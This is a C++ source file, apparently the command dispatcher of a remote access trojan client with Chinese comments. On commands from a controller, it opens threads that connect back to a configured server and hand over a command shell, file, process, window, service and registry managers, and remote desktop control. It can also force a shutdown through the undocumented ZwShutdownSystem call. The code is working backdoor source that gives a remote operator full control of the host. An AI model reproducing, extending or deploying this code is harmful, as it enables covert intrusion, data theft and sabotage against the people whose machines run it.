#include "KernelManager.h"
#include "Common.h"
#include "ClientInstantManager.h"
#include "ClientCmdManager.h"
#include "ClientProcessManager.h"
#include "ClientWindowManager.h"
#include "ClientFileManager.h"
#include "ClientRemoteControll.h"
#include "ClientServiceManager.h"
#include "ClientRegisterManager.h"


extern char  __ServerIP[MAX_PATH];
extern unsigned short __ServerPort;
CKernelManager::CKernelManager(CIOCPClient* ClientObject):CManager(ClientObject)
{
	m_ThreadHandleCount = 0;
}
CKernelManager::~CKernelManager()
{

}





void CKernelManager::ShutDown()
{
	//获得ntdll模块的函数
	  HMODULE NtdllModuleBase = LoadLibraryA("Ntdll.DLL");  //返回之前加载的基地址

	  if (NtdllModuleBase==NULL)
	  {
		  return;
	  }
	  typedef int (_stdcall *pfnZwShutdownSystem)(int);
	  pfnZwShutdownSystem  ZwShutdownSystem = NULL;
	  ZwShutdownSystem = (pfnZwShutdownSystem)GetProcAddress(NtdllModuleBase,"ZwShutdownSystem");

	  if (ZwShutdownSystem==NULL)
	  {
		  goto Exit;
	  }
	   ZwShutdownSystem(2); 
Exit:
	  if (NtdllModuleBase!=NULL)
	  {
		  FreeLibrary(NtdllModuleBase);
		  NtdllModuleBase = NULL;
	  }
}
void CKernelManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_GET_OUT:
	{
	
		IsToken = CLIENT_GET_OUT;
		
		m_ClientObject->OnServerSending((char*)&IsToken, 1);

		break;
	}

	case CLIENT_INSTANT_MESSAGE_REQUEST:
	{
		//启动线程
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)InstantMessageProcedure,
			NULL, 0, NULL);

		break;
	}

	case CLIENT_SHUT_DOWN_REQUEST:
	{

		IsToken = CLIENT_SHUT_DOWN_REPLY;
		m_ClientObject->OnServerSending((char*)&IsToken, 1);
		Sleep(1);
		EnableSeDebugPrivilege("SeShutdownPrivilege", TRUE);
		ShutDown();

		break;
	}
	case CLIENT_CMD_MANAGER_REQUIRE:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)CmdManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_PROCESS_MANAGER_REQUIRE:
	{

		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)ProcessManagerProcedure,
			NULL, 0, NULL);

		break;
	}
	case CLIENT_WINDOW_MANAGER_REQUIRE:
	{

		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)WindowManagerProcedure,
			NULL, 0, NULL);

		break;
	}
	case CLIENT_FILE_MANAGER_REQUIRE:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)FileManagerProcedure,
			NULL, 0, NULL);

		break;
	}
	case CLIENT_REMOTE_CONTROLL_REQUIRE:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)RemoteControllProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_SERVICE_MANAGER_REQUIRE:
	{
		
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)ServiceManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	case CLIENT_REGISTER_MANAGER_REQUIRE:
	{
		m_ThreadHandle[m_ThreadHandleCount++] = CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)RegisterManagerProcedure,
			NULL, 0, NULL);
		break;
	}
	default:
		break;
	}
}

DWORD WINAPI InstantMessageProcedure(LPVOID ParameterData)
{
	CIOCPClient	ClientObject; 

	if (!ClientObject.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CClientInstantManager	Manager(&ClientObject);
	ClientObject.WaitForEvent();
}

DWORD WINAPI CmdManagerProcedure(LPVOID ParameterData)
{
	CIOCPClient	ClientObject;

	if (!ClientObject.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CClientCmdManager	Manager(&ClientObject);
	ClientObject.WaitForEvent();
}

DWORD WINAPI ProcessManagerProcedure(LPVOID ParameterData)
{
	CIOCPClient	ClientObject;

	if (!ClientObject.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CClientProcessManager	Manager(&ClientObject);
	ClientObject.WaitForEvent();
}

DWORD WINAPI WindowManagerProcedure(LPVOID ParameterData)
{
	CIOCPClient	ClientObject;

	if (!ClientObject.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CClientWindowManager	Manager(&ClientObject);
	ClientObject.WaitForEvent();
}

DWORD WINAPI FileManagerProcedure(LPVOID ParameterData)
{
	CIOCPClient	ClientObject;

	if (!ClientObject.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CClientFileManager	Manager(&ClientObject);
	ClientObject.WaitForEvent();
}

DWORD WINAPI RemoteControllProcedure(LPVOID ParameterData)
{
	CIOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CClientRemoteControll	Manager(&ClientObject);
	ClientObject.WaitForEvent();            //事件

}

DWORD WINAPI ServiceManagerProcedure(LPVOID ParameterData)
{
	CIOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CClientServiceManager	Manager(&ClientObject);
	ClientObject.WaitForEvent();            //事件

}

DWORD WINAPI RegisterManagerProcedure(LPVOID ParameterData)
{
	CIOCPClient	ClientObject;
	if (!ClientObject.ConnectServer(__ServerIP, __ServerPort))
		return -1;
	CClientRegisterManager	Manager(&ClientObject);
	ClientObject.WaitForEvent();            //事件

}